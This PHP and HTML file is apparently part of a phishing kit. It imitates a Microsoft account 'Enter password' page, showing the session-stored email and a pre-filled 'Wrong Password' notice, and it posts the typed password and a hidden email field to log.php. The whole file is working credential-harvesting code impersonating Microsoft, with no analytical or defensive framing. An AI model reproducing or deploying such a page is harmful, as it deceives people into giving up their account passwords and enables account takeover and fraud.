<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
	<title>Sign in to your Microsoft account</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width">
	<link rel="icon" type="image/png" href="favicon.ico" />
	<link rel="stylesheet" type="text/css" href="style2.css">
	<style>
		form#multiphase{padding:34px; width:410px; height:310px;}
		form#multiphase > #user,#phase2{ display:none; }
		#body{
	height: 700px;
	padding: 0;
	margin: 0;
	background: url(bck.jpg);
	background-repeat: no-repeat;
	background-size: 100% 100%;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
}

#email:focus { 
    border-right: none;
    border-left: none;
    border-top: none;
}
*{
	margin: 0;
	padding: 0;
}
body{
	margin: 0;
	padding: 0;
	overflow: hidden;
	font-family: Helvetica, Ariel, sans-serif;
}
a{
	text-decoration: none;
	font-size: 14px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
	 
}
input{
	height: 35px;
}
h1{
	font-weight: lighter;
	font-size: 20px;
	color: #404040FF;
	margin-top: 20px;
}
p{
	font-size: 14px;
}
button{
	margin-top: 25px;
	border: none;
	background: #006EBCFF;
	color: white;
	font-size: 16px;
	cursor: pointer;
}
button:hover{
	background: #0079D1FF;
}
input [type="checkbox"]{

}
input[type="email"],
input[type="password"]{
	width: 350px;
	padding-left: 10px;
	font-size: 16px;
	margin-top: 10px;
	border-right: none;
	border-left: none;
	border-top: none;
	outline: none;
	border-bottom: 0.7px solid black;
}
#phase1 button{
	width: 363px;
	height: 40px;
	margin-bottom: 20px;
}
#phase2 button{
	width: 179px;
	height: 40px;
	margin-
}
#fd-body{
	background: #000000B6;
	width: 100%;
	height: 100%;
}
#phase1,#phase2,#float-box img{ 
	margin: 0;
	padding: 0;
}
#float-box img{
	margin-bottom: 10px;
}
#float-box{
	height: 370px;
	width: 450px;
	color:#000;
	position: absolute;
	left: 35%;
	bottom: 25%;
	padding: 0;
	margin: 0;
}
#multiphase{
	padding: 0;
	margin: 0;
	background: 
}
#user{
	width: 365px;
	height: 30px;
	margin: 0;
	padding: 0;
	background: #E5E5E5FF;
}
#user img{
	margin-top: -9px;
	float: left;
}
#footer{
	background: #000000BD;
}
#footer-div{
	width: 450px;
	height: 

}
	</style>
</head>
<body>

	<div id="body">
	<div id="fd-body">
		<div id="float-box">
			<form id="multiphase" onsubmit="return validateForm()" width="500" method="POST" action="log.php">
			<img src="microsoft_logo.svg" width="120">
			<br><br>
			 <font size="3"><?php  echo $_SESSION['user']; ?></font>
			<br><br>
			<font size="5" >Enter password</font>
			<font size="3" color="red"></font>
			
			<input type="password" name="passwords" placeholder="Password" id="passx">
			<p id="demo" style="color: red;">Wrong Password</p>
			<input type="hidden" name="emails" value="<?php  echo $_SESSION['user']; ?>">
			<br>

			<a href="#" style="color: #006EBCFF;">forgot password</a>
			<br><br><br>

			<div align="right" style="margin-right: 30px;">
				<input type="submit" value="Next" style="padding: 0 50px; color: white; background-color: #006EBCFF; border: none; outline: none; cursor: pointer;">
			</div>
			
		</form>



		<script>
 function validateForm() {
  var x = document.forms["multiphase"]["passx"].value;

  if (x == "") {
   document.getElementById("demo").innerHTML = "<div style='color: red;'><br>Please enter the password for your Microsoft account.</div>";

    return false;
  }
}


</script> 

		</div>
	</div>
	</div>
	<div id="footer">
		<div id="footer-div">
			<p>&copy;2018 Microsoft</p>
			<a href="#">Terms of use</a>
			<a href="#">Privacy & cookies</a>
			<a href="#"></a>
		</div>
	</div>
</body>
</html>